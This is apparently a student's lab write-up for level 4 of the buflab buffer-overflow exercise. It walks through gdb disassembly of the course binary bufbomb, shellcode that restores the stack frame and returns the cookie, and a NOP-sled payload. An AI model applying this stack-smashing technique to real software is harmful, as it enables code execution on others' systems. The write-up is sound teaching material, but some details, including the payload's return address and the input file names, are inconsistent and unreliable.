Level 4: Nitroglycerin
======================

Goal = your exploit code should set your hex cookie as the return value, restore any corrupted state, push the correct return location on the stack, and execute a ret instruction to really return to test().

Type:
```
unix> gdb bufbomb
(gdb) break testn
(gdb) run -nu quinnliu
(gdb) disas
```

Gives you:
```
(gdb) disas
Dump of assembler code for function testn:
   0x08048c1c <+0>:     push   %ebp
   0x08048c1d <+1>:     mov    %esp,%ebp
   0x08048c1f <+3>:     sub    $0x28,%esp
=> 0x08048c22 <+6>:     movl   $0xdeadbeef,-0xc(%ebp)
   0x08048c29 <+13>:    call   0x8048be6 <getbufn>
   0x08048c2e <+18>:    mov    -0xc(%ebp),%edx
   0x08048c31 <+21>:    cmp    $0xdeadbeef,%edx
   0x08048c37 <+27>:    je     0x8048c47 <testn+43>
   0x08048c39 <+29>:    movl   $0x804a098,(%esp)
   0x08048c40 <+36>:    call   0x8048940 <puts@plt>
   0x08048c45 <+41>:    jmp    0x8048c7d <testn+97>
   0x08048c47 <+43>:    cmp    0x804c1e4,%eax
   0x08048c4d <+49>:    jne    0x8048c6d <testn+81>
   0x08048c4f <+51>:    mov    %eax,0x4(%esp)
   0x08048c53 <+55>:    movl   $0x804a0c4,(%esp)
   0x08048c5a <+62>:    call   0x80488e0 <printf@plt>
   0x08048c5f <+67>:    movl   $0x4,(%esp)
   0x08048c66 <+74>:    call   0x80490d4 <validate>
   0x08048c6b <+79>:    jmp    0x8048c7d <testn+97>
   0x08048c6d <+81>:    mov    %eax,0x4(%esp)
   0x08048c71 <+85>:    movl   $0x8049ee7,(%esp)
   0x08048c78 <+92>:    call   0x80488e0 <printf@plt>
   0x08048c7d <+97>:    leave
   0x08048c7e <+98>:    ret
End of assembler dump.
```

Type:
```
(gdb) break getbufn
(gdb) cont
(gdb) disas
```

Gives you:
```
(gdb) disas
Dump of assembler code for function getbufn:
   0x08048be6 <+0>:     push   %ebp
   0x08048be7 <+1>:     mov    %esp,%ebp
   0x08048be9 <+3>:     sub    $0x218,%esp
=> 0x08048bef <+9>:     lea    -0x208(%ebp),%eax
   0x08048bf5 <+15>:    mov    %eax,(%esp)
   0x08048bf8 <+18>:    call   0x8048b4a <Gets>
   0x08048bfd <+23>:    mov    $0x1,%eax
   0x08048c02 <+28>:    leave
   0x08048c03 <+29>:    ret
End of assembler dump.
```

Then type the following into the file "assemblylevel4.s"
```
lea 0x28 (%esp)   , %ebp # restore ebp register contents
movl  $0x2d8cc70c , %eax # returns the cookie value
pushl $0x08048c2e        # return address pointing instruction after getbufn() call in testn()
ret
```

Then type:
```
unix> gcc -m32 -c assemblylevel4.s
unix> objdump -d assemblylevel4.o
```

Gives you:
```
1016:quinnliu in buflab-handout > objdump -d assemblylevel4.o

assemblylevel4.o:     file format elf32-i386


Disassembly of section .text:

00000000 <.text>:
   0:   8d 6c 24 28             lea    0x28(%esp),%ebp
   4:   b8 0c c7 8c 2d          mov    $0x2d8cc70c,%eax
   9:   68 2e 8c 04 08          push   $0x8048c2e
   e:   c3                      ret
```

Now type:
```
unix> perl -e 'print "90 "x505, "8d 6c 24 28 b8 0c c7 8c 2d 68 2e 8c 04 08 c3 ", "30 31 32 33 ", "98 32 68 55 " ' > hexlevel4
```


```
unix> gdb bufboomb
(gdb) break getbufn
(gdb) run -nu quinnliu
Starting program: /home/ugrads/majors/quinnliu/Desktop/ComputerOrganizationII/buflab-handout/bufbomb -nu quinnliu
Userid: quinnliu
Cookie: 0x2d8cc70c

Breakpoint 1, 0x08048bef in getbufn ()
Missing separate debuginfos, use: debuginfo-install glibc-2.12-1.47.el6_2.5.i686
(gdb) print /x ($ebp-0x208)
$1 = 0x55683148 # <=== 1st Address
(gdb) cont
Continuing.
Type string:hello
Dud: getbufn returned 0x1
Better luck next time

Breakpoint 1, 0x08048bef in getbufn ()
(gdb) print /x ($ebp-0x208)
$2 = 0x55683188 # <=== 2nd Address
(gdb) cont
Continuing.
Type string:hello
Dud: getbufn returned 0x1
Better luck next time

Breakpoint 1, 0x08048bef in getbufn ()
(gdb) print /x ($ebp-0x208)
$3 = 0x556831a8 # <=== 3rd Address
(gdb) cont
Continuing.
Type string:hello
Dud: getbufn returned 0x1
Better luck next time

Breakpoint 1, 0x08048bef in getbufn ()
(gdb) print /x ($ebp-0x208)
$4 = 0x55683158 # <=== 4th Address
(gdb) cont
Continuing.
Type string:hello
Dud: getbufn returned 0x1
Better luck next time

Breakpoint 1, 0x08048bef in getbufn ()
(gdb) print /x ($ebp-0x208)
$5 = 0x55683158 # <=== 5th Address
```

These are the 5 addresses:
```
$1 = 0x55683148 # <=== 1st Address = 1432891720 in base 10
$2 = 0x55683188 # <=== 2nd Address = 1432891784 in base 10
$3 = 0x556831a8 # <=== 3rd Address = 1432891816 in base 10
$4 = 0x55683158 # <=== 4th Address = 1432891736 in base 10
$5 = 0x55683158 # <=== 5th Address = 1432891736 in base 10
```

The maximum of the 5 addresses is the 3rd address = 1432891816

Now type:
```
unix> ./hex2raw -n < hexlevel4 > raw
```

Now type:
```
unix> ./hex2raw -n < hexlevel4_2 > raw
unix> gdb bufbomb
(gdb) run -nu quinnliu < raw
```

OMG it works!!!



